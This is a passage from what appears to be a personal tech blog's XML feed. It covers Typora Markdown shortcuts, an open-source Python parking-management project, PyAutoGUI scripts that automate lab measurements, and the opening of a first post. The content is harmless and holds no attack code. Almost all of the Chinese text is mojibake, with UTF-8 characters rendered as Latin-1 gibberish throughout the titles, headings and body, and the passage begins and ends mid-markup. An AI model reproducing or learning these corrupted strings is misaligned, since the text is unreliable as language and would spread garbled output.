enter</code></p><ol><li>ç¬¬ä¸€ä¸ª</li><li>ç¬¬äºŒä¸ª<ol><li>åµŒå¥—ä¸€ä¸‹</li><li>å†æ¥ä¸€ä¸‹<ol><li>å†åµŒå¥—ä¸€ä¸ª</li></ol></li><li>ç»§ç»­</li></ol></li><li>ç»§ç»­æ¥</li><li>å°±è¿™æ ·å§</li></ol><h2 id="ä»»åŠ¡åˆ—è¡¨"><a href="#ä»»åŠ¡åˆ—è¡¨" class="headerlink" title="ä»»åŠ¡åˆ—è¡¨"></a><strong>ä»»åŠ¡åˆ—è¡¨</strong></h2><p><code>- []</code> TODO</p><p><code>- [x]</code>å·²å®Œæˆ</p><blockquote><ul><li><input disabled="" type="checkbox"> è¿™æ˜¯å¾…å®Œæˆçš„</li><li><input checked="" disabled="" type="checkbox"> è¿™ä¸ªå·²å®Œæˆäº†</li></ul></blockquote><hr><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a><strong>å¼•ç”¨</strong></h2><p><code>&gt; + space + enter</code></p><p>æˆ–è€…</p><p><code>ctrl + shift + Q</code></p><blockquote><p>è¿™å°±æ˜¯å¼•ç”¨</p></blockquote><blockquote><p>è¿™ä¹Ÿæ˜¯</p><blockquote><p>â€‹    è¿˜å¯ä»¥åµŒå¥—å¼•ç”¨</p><blockquote><p>â€‹    å†æ¥ä¸€ä¸ª</p></blockquote><p>è¿™ä¹Ÿè¡Œ</p></blockquote><p>ä¸€æ ·çš„</p></blockquote><h2 id="æ’å…¥å›¾ç‰‡"><a href="#æ’å…¥å›¾ç‰‡" class="headerlink" title="æ’å…¥å›¾ç‰‡"></a><strong>æ’å…¥å›¾ç‰‡</strong></h2><p><code>ctrl + shift + I</code></p><p>ç½‘ä¸Šè¯´ç”¨<code>MPic</code>åšå›¾åºŠæŒºä¸é”™çš„ã€‚ï¼ˆè¿˜æ²¡è¯•è¿‡</p><p><img src="/2019/08/29/typora_tips/cat.jpg" alt="å–µå•Š"></p><p>ç›´æ¥æ‹–è¿›æ¥ä¹Ÿè¡Œ</p><h2 id="æ’å…¥é“¾æ¥"><a href="#æ’å…¥é“¾æ¥" class="headerlink" title="æ’å…¥é“¾æ¥"></a><strong>æ’å…¥é“¾æ¥</strong></h2><p><code>ctrl + K</code></p><blockquote><p><a href="https://miaotony.github.io/">è¿™æ˜¯é“¾æ¥ï¼Œè·³è½¬åˆ°æˆ‘çš„åšå®¢å“ˆ</a></p></blockquote><h2 id="æ’å…¥è¡¨æ ¼"><a href="#æ’å…¥è¡¨æ ¼" class="headerlink" title="æ’å…¥è¡¨æ ¼"></a><strong>æ’å…¥è¡¨æ ¼</strong></h2><p><code>ctrl + T</code></p><table><thead><tr><th>mm</th><th>text</th></tr></thead><tbody><tr><td>æµ‹è¯•</td><td>å†æµ‹è¯•</td></tr><tr><td>123</td><td>456</td></tr></tbody></table><h2 id="æ’å…¥ä»£ç "><a href="#æ’å…¥ä»£ç " class="headerlink" title="æ’å…¥ä»£ç "></a><strong>æ’å…¥ä»£ç </strong></h2><h3 id="å•è¡Œä»£ç ï¼ˆæ–‡ä¸­çš„ä»£ç ï¼‰"><a href="#å•è¡Œä»£ç ï¼ˆæ–‡ä¸­çš„ä»£ç ï¼‰" class="headerlink" title="å•è¡Œä»£ç ï¼ˆæ–‡ä¸­çš„ä»£ç ï¼‰"></a>å•è¡Œä»£ç ï¼ˆæ–‡ä¸­çš„ä»£ç ï¼‰</h3><p>ctrl + shift + `</p><blockquote><p>`è¾“å…¥ä»£ç `</p></blockquote><h3 id="å¤šè¡Œä»£ç ï¼ˆä»£ç å—ï¼‰"><a href="#å¤šè¡Œä»£ç ï¼ˆä»£ç å—ï¼‰" class="headerlink" title="å¤šè¡Œä»£ç ï¼ˆä»£ç å—ï¼‰"></a>å¤šè¡Œä»£ç ï¼ˆä»£ç å—ï¼‰</h3><p><code>ctrl + shift + K</code></p><blockquote><p>``` </p><p>è¾“å…¥ä»£ç </p><p>```</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span> <span class="token comment"># Python</span></code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, this is C."</span><span class="token punctuation">)</span> <span class="token comment">// C</span></code></pre><pre class="language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">disp</span><span class="token punctuation">(</span>"Hello<span class="token punctuation">,</span> this is MATLAB<span class="token punctuation">.</span>"<span class="token punctuation">)</span> <span class="token comment">% MATLAB</span></code></pre><pre class="language-lua" data-language="lua"><code class="language-lua"><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is lua."</span><span class="token punctuation">)</span>  <span class="token comment">-- lua</span></code></pre><h2 id="æ’å…¥è¡¨æƒ…"><a href="#æ’å…¥è¡¨æƒ…" class="headerlink" title="æ’å…¥è¡¨æƒ…"></a><strong>æ’å…¥è¡¨æƒ…</strong></h2><p><code>:åç§°:</code></p><p>(è‹±æ–‡çŠ¶æ€ä¸‹)</p><p><span class="github-emoji"><span>ğŸ±</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f431.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <span class="github-emoji"><span>ğŸ¶</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f436.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p><p><img src="/2019/08/29/typora_tips/1.png" alt="ç¤ºä¾‹"></p><p>PSï¼šå¾®è½¯è¾“å…¥æ³•å¯ä»¥ç”¨<code>ctrl + shift + B</code>å¼¹å‡ºè¡¨æƒ…çª—å£ã€‚</p><p>ğŸ˜€ğŸ‘Œ</p><h2 id="æ’å…¥åˆ†å‰²çº¿"><a href="#æ’å…¥åˆ†å‰²çº¿" class="headerlink" title="æ’å…¥åˆ†å‰²çº¿"></a><strong>æ’å…¥åˆ†å‰²çº¿</strong></h2><p><code>---</code></p><blockquote><p>ä¸‹é¢æ˜¯åˆ†å‰²çº¿</p><hr></blockquote><h2 id="æ’å…¥é«˜äº®æ˜¾ç¤º"><a href="#æ’å…¥é«˜äº®æ˜¾ç¤º" class="headerlink" title="æ’å…¥é«˜äº®æ˜¾ç¤º"></a><strong>æ’å…¥é«˜äº®æ˜¾ç¤º</strong></h2><p><code>==ä¸­é—´å†™æ–‡å­—==</code></p><blockquote><p>==è¿™æ˜¯é«˜äº®==</p></blockquote><h2 id="æ’å…¥è„šæ³¨"><a href="#æ’å…¥è„šæ³¨" class="headerlink" title="æ’å…¥è„šæ³¨"></a><strong>æ’å…¥è„šæ³¨</strong></h2><p><code>æ–‡å­—[^è„šæ³¨]</code></p><blockquote><p>ç¤ºä¾‹<a href="%E8%BF%99%E6%98%AF%E8%84%9A%E6%B3%A8%E5%95%A6%E3%80%82">^1</a></p></blockquote><h2 id="æ’å…¥å…¬å¼"><a href="#æ’å…¥å…¬å¼" class="headerlink" title="æ’å…¥å…¬å¼"></a><strong>æ’å…¥å…¬å¼</strong></h2><p><code>ctrl + shift + M</code></p><p>æˆ–è€…</p><p>è¡Œå†…å…¬å¼ï¼ˆå†…è”å…¬å¼ï¼‰ï¼š  <code>$å…¬å¼$</code></p><p>è¡Œé—´å…¬å¼ï¼š     <code>$$ å…¬å¼ $$</code></p><p>$$<br>\lim_{x\to +\infty} \frac{1}{x}=0<br>$$<br>åŠ ä¸ªæ¡†è¯•è¯•ï¼ˆ<code>\boxed{}</code>ï¼‰ï¼š<br>$$<br>\boxed{ \overrightarrow{AB}}<br>$$</p><blockquote><p>è¿™æ˜¯è¡Œå†…å…¬å¼ $ \sqrt[3]{test} $ ï¼Œå¦™å•Š~</p></blockquote><p>å…·ä½“çš„è¿˜å¾—æ…¢æ…¢çœ‹å‘¢ã€‚</p><p>é¡ºä¾¿å­¦ä¸€æ³¢<code>LaTex</code>ä¹ŸæŒºä¸é”™çš„~</p><h2 id="æ’å…¥ç›®å½•"><a href="#æ’å…¥ç›®å½•" class="headerlink" title="æ’å…¥ç›®å½•"></a><strong>æ’å…¥ç›®å½•</strong></h2><p><code>[toc]  + ENTER</code></p><blockquote><p>å°±æ˜¯æœ€ä¸Šé¢é‚£ä¸ªå•¦~</p></blockquote><hr><h2 id="æ–°å»ºæ–‡ä»¶"><a href="#æ–°å»ºæ–‡ä»¶" class="headerlink" title="æ–°å»ºæ–‡ä»¶"></a><strong>æ–°å»ºæ–‡ä»¶</strong></h2><p><code>ctrl + N</code>    </p><h2 id="é€‰ä¸­ä¸­æ–‡-è‹±æ–‡"><a href="#é€‰ä¸­ä¸­æ–‡-è‹±æ–‡" class="headerlink" title="é€‰ä¸­ä¸­æ–‡/è‹±æ–‡"></a><strong>é€‰ä¸­ä¸­æ–‡/è‹±æ–‡</strong></h2><p><code>ctrl + D</code></p><p>miao miao~ </p><p><code>ctrl + Shift + å·¦/å³</code> å¿«é€Ÿé€‰ä¸­æ•´ä¸ªè¯è¯­/å•è¯ã€‚</p><h2 id="é€‰ä¸­æ•´è¡Œ"><a href="#é€‰ä¸­æ•´è¡Œ" class="headerlink" title="é€‰ä¸­æ•´è¡Œ"></a><strong>é€‰ä¸­æ•´è¡Œ</strong></h2><p><code>ctrl + L</code></p><h2 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a><strong>æŸ¥æ‰¾</strong></h2><p><code>ctrl + F</code></p><h2 id="æ›¿æ¢"><a href="#æ›¿æ¢" class="headerlink" title="æ›¿æ¢"></a><strong>æ›¿æ¢</strong></h2><p><code>ctrl + H</code></p><h2 id="è·³è½¬åˆ°å¼€å¤´-ç»“å°¾"><a href="#è·³è½¬åˆ°å¼€å¤´-ç»“å°¾" class="headerlink" title="è·³è½¬åˆ°å¼€å¤´/ç»“å°¾"></a><strong>è·³è½¬åˆ°å¼€å¤´/ç»“å°¾</strong></h2><p><code>ctrl + HOME</code> è·³è½¬è‡³æ–‡ç« å¼€å¤´</p><p><code>ctrl + END</code>   è·³è½¬è‡³æ–‡ç« æœ«å°¾</p><h2 id="æ‰“å¼€æ–‡ä»¶ï¼ˆç¬”è®°ï¼‰"><a href="#æ‰“å¼€æ–‡ä»¶ï¼ˆç¬”è®°ï¼‰" class="headerlink" title="æ‰“å¼€æ–‡ä»¶ï¼ˆç¬”è®°ï¼‰"></a><strong>æ‰“å¼€æ–‡ä»¶ï¼ˆç¬”è®°ï¼‰</strong></h2><p><code>ctrl + P</code></p><h2 id="å…¨å±æ˜¾ç¤º"><a href="#å…¨å±æ˜¾ç¤º" class="headerlink" title="å…¨å±æ˜¾ç¤º"></a><strong>å…¨å±æ˜¾ç¤º</strong></h2><p><code>F11</code></p><h2 id="ä¾§è¾¹æ "><a href="#ä¾§è¾¹æ " class="headerlink" title="ä¾§è¾¹æ "></a><strong>ä¾§è¾¹æ </strong></h2><p><code>ctrl + shift + L</code></p><h2 id="æ¸…é™¤æ ¼å¼"><a href="#æ¸…é™¤æ ¼å¼" class="headerlink" title="æ¸…é™¤æ ¼å¼"></a><strong>æ¸…é™¤æ ¼å¼</strong></h2><p><code>ctrl + \</code></p><h2 id="åˆ‡æ¢åˆ°ä»£ç æ¨¡å¼"><a href="#åˆ‡æ¢åˆ°ä»£ç æ¨¡å¼" class="headerlink" title="åˆ‡æ¢åˆ°ä»£ç æ¨¡å¼"></a><strong>åˆ‡æ¢åˆ°ä»£ç æ¨¡å¼</strong></h2><p><code>ctrl + /</code></p><p><strong><em>==etc.==</em></strong></p><p>è¿˜æœ‰æŒºå¤šè¿˜è¦æ…¢æ…¢å»å‘æ˜å‘¢~</p><hr><p>é¡ºä¾¿è¯´ä¸€ä¸‹</p><p><code>Snipaste</code> è¿™ä¸ªæˆªå›¾å·¥å…·æŒºå¼ºå¤§çš„</p><p><a href="https://zh.snipaste.com/">å®˜ç½‘</a> <a href="https://zh.snipaste.com/">https://zh.snipaste.com/</a></p><blockquote><p>æœ¬æ–‡æ¬è¿è‡ªæˆ‘çš„csdnåšå®¢å•¦~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | å¼€æºä¸€ä¸ªè‡ªå·±çš„Pythonå°é¡¹ç›®ã€ŒPark at easeã€åœè½¦åœºç®¡ç†ç³»ç»Ÿ</title>
      <link href="2019/08/18/Park_at_ease/"/>
      <url>2019/08/18/Park_at_ease/</url>
      
        <content type="html"><![CDATA[<h1 id="Park-at-ease"><a href="#Park-at-ease" class="headerlink" title="Park at ease"></a>Park at ease</h1><p><strong>åœè½¦åœºç®¡ç†ç³»ç»Ÿ</strong><br><em>åŸºäºPythonå®ç°</em>  </p><p><strong>Park Management System</strong><br><em>Based on Pythonâ€¦</em>    </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hello, this is Park_at_ease!'</span><span class="token punctuation">)</span></code></pre><p><img src="/2019/08/18/Park_at_ease/20190818195449125.png" alt="è¿è¡Œç•Œé¢"></p><h2 id="ä¸€äº›è¯´æ˜"><a href="#ä¸€äº›è¯´æ˜" class="headerlink" title="ä¸€äº›è¯´æ˜"></a>ä¸€äº›è¯´æ˜</h2><p>è¿™ä¸ªé¡¹ç›®æœ¬æ¥æ˜¯ç»™éƒ¨é—¨é‡Œå°å¹²äº‹å¸ƒç½®çš„ã€Š2019å¯’å‡è¿›é˜¶æŒ‡å—ã€‹é‡Œ Section2 çš„è¯¾è®¾ä»»åŠ¡ï¼ˆé¢˜ç›®åŸºæœ¬ä¸Šæ˜¯æ ¹æ®è‡ªå·±çš„æƒ³æ³•å‡ºçš„ï¼‰ï¼Œå½“æ—¶è‡ªå·±æ­£å¥½åœ¨å­¦Pythonï¼Œå°±æƒ³æ‹¿è¿™ä¸ªé¡¹ç›®ç»ƒç»ƒæ‰‹ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ä¸ªåŸºäºPythoné¢å‘å¯¹è±¡å®ç°çš„åœè½¦åœºç®¡ç†ç³»ç»Ÿã€‚  </p><p>åŸæ¥è¿™ä¸ªé¡¹ç›®éƒ½æ˜¯è‡ªå·±å¼„ç€ç©çš„ï¼Œè¿™å‡ å¤©æ•´ç†æ–‡ä»¶å‘ç°å‡ ä¸ªæœˆå‰è¿˜å†™äº†è¿™ç©æ„å„¿ï¼Œè¿˜æŒºæœ‰æ„æ€çš„ã€‚<br>è¿™ä¸ªé¡¹ç›®å…¶å®è¿˜æœ‰å¾ˆå¤šå¯ä»¥å¼€å‘çš„ç©ºé—´çš„ï¼Œäºæ˜¯å°±æƒ³ç€æŠŠå®ƒå¼€æºäº†å§ï¼Œå¸Œæœ›å¤§å®¶å¯ä»¥ä¸€èµ·æ¥å®Œå–„å‘¢ï¼  </p><p><em>PS:åŸåˆ™ä¸Šä¸æä¾›æŠ€æœ¯æ”¯æŒå“ˆã€‚</em></p><hr><p><strong>é¡¹ç›®ç½‘ç«™ï¼ˆåŸºäºGithub Pagesæ­å»ºï¼‰ï¼š</strong><br><a href="https://miaotony.github.io/Park_at_ease/">æ¥ç‚¹æˆ‘å“ˆ</a> æˆ– <a href="https://miaotony.github.io/Park_at_ease/">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHubé¡¹ç›®ç½‘å€ï¼š</strong><br><a href="https://github.com/miaotony/Park_at_ease">æ¥ç‚¹æˆ‘é¸­</a> æˆ– <a href="https://github.com/miaotony/Park_at_ease">https://github.com/miaotony/Park_at_ease</a></p><p>æ¬¢è¿å¤§å®¶åœ¨æ­¤åŸºç¡€ä¸Šç»§ç»­å®Œå–„é¸­~<br><strong>æ¬¢è¿Starã€Forkã€æPR &amp; issueï¼</strong></p><p><strong>ä½¿ç”¨åŠè½¬è½½æ—¶è¯·æ³¨æ˜å‡ºå¤„ï¼Œä¿ç•™ä½œè€…ä¿¡æ¯ï¼Œä¸¥ç¦å•†ç”¨ï¼Œä¸¥ç¦ç”¨äºå®Œæˆè¯¾è®¾ä»»åŠ¡ï¼Œè°¢è°¢ï¼</strong>  </p><hr><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2> <a id="more"></a> <p>è¿™æ˜¯ç¼–è€…å‚è€ƒäº†ä¸€å°éƒ¨åˆ†ç½‘ç»œä¸Šç›¸å…³çš„é¢˜ç›®ï¼Œç»“åˆå®é™…ç”Ÿæ´»ï¼Œèåˆäº†è‡ªå·±ä¸€äº›æƒ³åˆ°çš„ï¼Œç»™å°å¹²äº‹ä»¬å‡ºçš„é¢˜ç›®ã€‚<br>è¿™é‡Œç›´æ¥å°±æˆªå±æ”¾å‡ºæ¥å§ï¼ŒPDFè¿˜æœ‰åˆ«çš„å†…å®¹æ‡’å¾—æ”¹äº†ã€‚<br>å¦‚æœæœ‰ä»€ä¹ˆå»ºè®®<strong>æ¬¢è¿åœ¨GitHubä¸Šæissue</strong>æˆ–è€…<strong>åœ¨è¿™é‡Œè¯„è®º</strong>å“ˆ~ï¼  </p><p><img src="/2019/08/18/Park_at_ease/20190818165341354.png" alt="20190818165341354">  </p><p><img src="/2019/08/18/Park_at_ease/20190818165453514.png" alt="20190818165453514"></p><p><img src="/2019/08/18/Park_at_ease/20190818165508495.png" alt="20190818165508495"></p><p><img src="/2019/08/18/Park_at_ease/20190818165517893.png" alt="20190818165517893"></p><p><img src="/2019/08/18/Park_at_ease/20190818165530183.png" alt="20190818165530183"></p><p><img src="/2019/08/18/Park_at_ease/20190818165538685.png" alt="20190818165538685"></p><p><img src="/2019/08/18/Park_at_ease/20190818165548553.png" alt="20190818165548553"></p><hr><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> ç®¡ç†å‘˜ç•Œé¢ Administrator Interface  </li><li><input checked="" disabled="" type="checkbox"> æ–‡ä»¶æ“ä½œ FileIO</li><li><input checked="" disabled="" type="checkbox"> ç™»å½•ç•Œé¢ Login  </li><li><input disabled="" type="checkbox"> ç™»å½•åŠ å¯† Login Encryption</li><li><input disabled="" type="checkbox"> å›¾å½¢ç•Œé¢ GUI  </li><li><input disabled="" type="checkbox"> å¤šçº¿ç¨‹æˆ–å¤šè¿›ç¨‹ Multithreading or Multiprocessing  </li><li><input disabled="" type="checkbox"> é‚®ä»¶æ¨é€ Email Push  </li><li><input disabled="" type="checkbox"> å¾®ä¿¡æ¨é€ WeChat Push  </li><li><input disabled="" type="checkbox"> TCP  </li><li><input disabled="" type="checkbox"> åµŒå…¥å¼å¼€å‘ Embedded Development<br>  etc.  </li></ul><hr><p><strong>å…·ä½“è¯·ç§»æ­¥åˆ°GitHubé¸­ï¼</strong></p><p><strong>é¡¹ç›®ç½‘ç«™ï¼ˆåŸºäºGithub Pagesæ­å»ºï¼‰ï¼š</strong><br><a href="https://miaotony.github.io/Park_at_ease/">æ¥ç‚¹æˆ‘å“ˆ</a> æˆ– <a href="https://miaotony.github.io/Park_at_ease/">https://miaotony.github.io/Park_at_ease/</a></p><p><strong>GitHubé¡¹ç›®ç½‘å€ï¼š</strong><br><a href="https://github.com/miaotony/Park_at_ease">æ¥ç‚¹æˆ‘é¸­</a> æˆ– <a href="https://github.com/miaotony/Park_at_ease">https://github.com/miaotony/Park_at_ease</a></p><p><img src="/2019/08/18/Park_at_ease/20190818195154540.png" alt="å–µ~"></p><p>æºœäº†æºœäº†<br>ä¸‹æ¬¡å†è§å•¦~</p><blockquote><p>æ¬è¿è‡ªæˆ‘çš„csdnåšå®¢å•¦~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | åŸºäºæ¨¡æ‹Ÿç‚¹å‡»å®ç°æ•°æ®è‡ªåŠ¨æµ‹é‡</title>
      <link href="2019/07/10/Idea_AutoMeasure/"/>
      <url>2019/07/10/Idea_AutoMeasure/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ¬è¿ä¸€ç¯‡ä¹‹å‰å†™çš„å°æƒ³æ³•å•¦~</p></blockquote><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>äººå·¥æ™ºèƒ½â€”â€”å…ˆäººå·¥åæ™ºèƒ½<br>å“ªé‡Œæœ‰ç°æˆæ•°æ®ç»™ä½ <br>è¿˜ä¸æ˜¯äººå·¥æ‰‹åŠ¨å»æµ‹â€¦â€¦  </p><p>å¤§åˆ›è¦æµ‹æ•°æ®emmmï¼Œç®€å•æ¥è¯´å°±æ˜¯ç‚¹ç‚¹æŒ‰é’®ï¼Œç­‰å®ƒæ•°æ®æµ‹é‡å®Œæˆï¼Œç„¶åæŒ‰ç…§å‘½åè§„èŒƒä¿å­˜ã€‚<br>å°±æ˜¯è¿™ä¸ªä¹Ÿå¤ªæ¯ç‡¥äº†8ï¼Œæ•ˆç‡è¿˜ä½ã€‚<br>ä¸å¦‚pyä¸€ä¸‹å†™ä¸ªè‡ªåŠ¨æ‰§è¡Œçš„ï¼<br>è¯´å†™å°±å†™å‘—<em>ï¼ˆæ–œçœ¼ç¬‘.gif)</em>  </p><h2 id="åˆä»£ç‰ˆæœ¬"><a href="#åˆä»£ç‰ˆæœ¬" class="headerlink" title="åˆä»£ç‰ˆæœ¬"></a>åˆä»£ç‰ˆæœ¬</h2><p>å‘ç°Pythonæœ‰ä¸ªç°æˆçš„ç¬¬ä¸‰æ–¹åº“å«<code>PyAutoGui</code>åº“ï¼Œå®ƒç»™çš„å‡½æ•°è¿˜æ˜¯æŒºæ–¹ä¾¿çš„ã€‚<br>æŒ‰ç…§æµ‹æ•°æ®æ“ä½œçš„æµç¨‹ç”¨ä»£ç è¿˜åŸä¸€éï¼Œæµ‹è¯•å‘ç°é€Ÿåº¦å¤ªå¿«äº†ç”µè„‘åƒä¸æ¶ˆï¼Œäºæ˜¯ä¹åˆ°å¤„åŠ å»¶æ—¶233ã€‚  </p><p>æ€»ä¹‹è¿˜æ˜¯æŒºä¸é”™çš„å§<br>è¾“å…¥<strong>è§’åº¦ã€æ¬¡æ•°ã€å¼€å§‹index</strong>ï¼ˆç¨‹åºå´©çš„æ—¶å€™å¤‡ç”¨ï¼‰ï¼Œ<br>ç„¶åå°±å¯ä»¥è‡ªåŠ¨å¼€å§‹æµ‹é‡ï¼Œæ–°å»ºæ–‡ä»¶å¤¹ï¼ŒæŒ‰é¡ºåºå‘½åä¿å­˜ã€‚  </p><p><img src="/2019/07/10/Idea_AutoMeasure/code.png" alt="code1"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code2.png" alt="code2"></p><p><img src="/2019/07/10/Idea_AutoMeasure/code3.png" alt="code3"></p><p>ç†è®ºä¸€å¤©å¯æµ‹çš„æ•°æ®é‡ä»270ç»„æé«˜åˆ°435ç»„ï¼Œ<strong>æ•ˆç‡æå‡äº†61%å§ï¼</strong>  </p><p>è¿˜è¦æ„Ÿè°¢æ½‡æ½‡å¼Ÿå¼Ÿé™ªæˆ‘debug å˜»å˜»å˜»~  </p><hr><h2 id="å‡çº§ç‰ˆ"><a href="#å‡çº§ç‰ˆ" class="headerlink" title="å‡çº§ç‰ˆ"></a>å‡çº§ç‰ˆ</h2><blockquote><p><em>Update on 20190725.</em></p></blockquote><p>ä¹‹å‰å†™çš„è‡ªåŠ¨æµ‹æ•°æ®çš„ç¨‹åºè¿˜æœ‰ç‚¹å°é—®é¢˜ï¼Œä»Šå¤©åˆæ›´æ–°äº†ä¸¤ä¸ªç‰ˆæœ¬ã€‚ã€‚</p><p>ç”±äºæµ‹é‡è½¯ä»¶çš„é—®é¢˜ï¼Œæ¯ç»„éƒ½ä¼šæ¼ä¸€äº›æ•°æ®ï¼Œæ‰€ä»¥è¿˜è¦æ‰‹åŠ¨è¡¥æµ‹ã€‚</p><p>äºæ˜¯ä¹ä»Šå¤©åŠ äº†ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„åˆ¤æ–­ï¼Œç¡®å®šä¿å­˜æˆåŠŸä¹‹åæ‰ç»§ç»­ä¸‹ä¸€ç»„æµ‹é‡ï¼Œè¿™æ ·å°±ä¸ç”¨è¡¥æµ‹äº†ï¼  </p><p>å¦å¤–è¿˜åŠ å…¥äº†logï¼Œè®°å½•æ—¥å¿—æ–‡ä»¶æ–¹ä¾¿æ£€æŸ¥é”™è¯¯ã€‚</p><p>å˜¿å˜¿å˜¿~</p><p><img src="/2019/07/10/Idea_AutoMeasure/update1.png" alt="update"></p><p><img src="/2019/07/10/Idea_AutoMeasure/update2.png" alt="è¿è¡Œç•Œé¢"></p><p><img src="/2019/07/10/Idea_AutoMeasure/log.png" alt="log"></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> æ¨¡æ‹Ÿç‚¹å‡» </tag>
            
            <tag> å¤§åˆ› </tag>
            
            <tag> è‡ªåŠ¨ </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸€ç¯‡ éšä¾¿å†™å†™</title>
      <link href="2019/07/09/FirstBlog/"/>
      <url>2019/07/09/FirstBlog/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>æ¬è¿è‡ªæˆ‘çš„CSDNåšå®¢ </p></blockquote><p>è¿™ç¯‡å¯ä»¥ç®—æ˜¯ç¬¬ä¸€æ¬¡å…¬å¼€å‘å‡ºæ¥çš„å§<br><em>ï¼ˆå…¶å®ä¸¥æ ¼æ¥è¯´ä¹Ÿä¸ç®—å•¦ï¼Œåªæ˜¯ä¹‹å‰å‘çš„å¹´ä»½è¿‡ä¹…ä¼°è®¡éƒ½404æˆ–è€…æ‰¾ä¸åˆ°äº†233</em></p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, everyone!"</span><span class="token punctuation">)</span></code></pre><h2 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h2><p>  ä¸Šäº†å¤§å­¦ä¹‹åï¼Œåšå¤§ä½œä¸šã€å†™è®ºæ–‡ã€å†™æŠ¥å‘Šã€åšé¡¹ç›®ã€å‚åŠ å„ç§æ¯”èµ›ï¼Œç»å¸¸éœ€è¦å„ç§æ‰¾èµ„æ–™ï¼Œå¤§å¤šæ˜¯<em>EE</em>å’Œ<em>CS</em>æ–¹å‘çš„ã€‚</p><p>è¿™æ—¶å€™ç»å¸¸å°±é€›åˆ°CSDNã€åšå®¢å›­ã€ç®€ä¹¦ã€é€¼ä¹ä¹‹ç±»çš„è¿™äº›ï¼Œæˆ–è€…å¤§ä½¬ä»¬è‡ªå·±æ­å»ºçš„åšå®¢ï¼Œå½“ç„¶è¿˜æœ‰Bç«™è¿™æ ·æœ‰ç€å„ç§å­¦ä¹ è§†é¢‘çš„å¥½åœ°æ–¹ã€‚</p><p>å¤§å®¶éƒ½ä¹äºæŠŠè‡ªå·±çš„ä½“ä¼šå’Œç»éªŒåˆ†äº«å‡ºæ¥ï¼Œå¯¹äºæˆ‘è¿™æ ·çš„èœé¸¡æ¥è¯´å¸®åŠ©å¾ˆå¤§é¸­ã€‚æ¯”å¦‚è¯´ç ç€ç ç€ä»£ç é‡åˆ°å•¥bugäº†ï¼Œç„¶åä¸Šæ¥ä¸€æŸ¥ï¼Œå¾ˆå¤šæ—¶å€™åˆ«äººä¹Ÿé‡åˆ°è¿‡ï¼Œäºæ˜¯ä¹ä»€ä¹ˆæƒ…å†µä¸‹é‡åˆ°çš„ã€å¦‚ä½•è§£å†³çš„å¤§éƒ½æœ‰äº†ï¼Œå¾ˆæ–¹ä¾¿å°±èƒ½è§£å†³é—®é¢˜å‘¢ã€‚</p><p>å…¶å®æœ¬æ¥å°±è§‰å¾—å†™ç‚¹ä¸œè¥¿æŒºæœ‰æ„æ€çš„ï¼Œç‰¹åˆ«æ˜¯çœ‹åˆ°èº«è¾¹çš„å°ä¼™ä¼´åœ¨CSDNä¸Šä¹Ÿå¼€äº†è‡ªå·±çš„è´¦å·ï¼Œå¼€å§‹åˆ†äº«è‡ªå·±çš„ä¸€äº› debug ç»å†ä»¥åŠç”Ÿæ´»å¸¸äº‹ï¼Œè¶Šå‘è§‰å¾—æŒºæœ‰æ„æ€çš„ä¹ŸæŒºæœ‰æ„ä¹‰çš„ã€‚äºæ˜¯æˆ‘ä¹Ÿæ¥å†™ä¸€å†™å‘—ã€‚ </p><p>ç™»å½•çš„æ—¶å€™çªç„¶æ‰å‘ç°ï¼ŒCSDNä¸Šæˆ‘çš„è´¦å·åŸæ¥7å¹´å‰å°±æ³¨å†Œäº†ï¼Œä¼°è®¡ä¹‹å‰è¿˜åªæ˜¯éšä¾¿é€›é€›ä»¥åŠä¸‹è½½äº›èµ„æ–™ï¼Œéƒ½æ²¡æœ‰åœ¨è¿™å„¿å†™è¿‡å•¥ä¸œè¥¿233ã€‚æ²¡äº‹é—®é¢˜ä¸å¤§å“ˆå“ˆå“ˆã€‚</p><hr><h2 id="When"><a href="#When" class="headerlink" 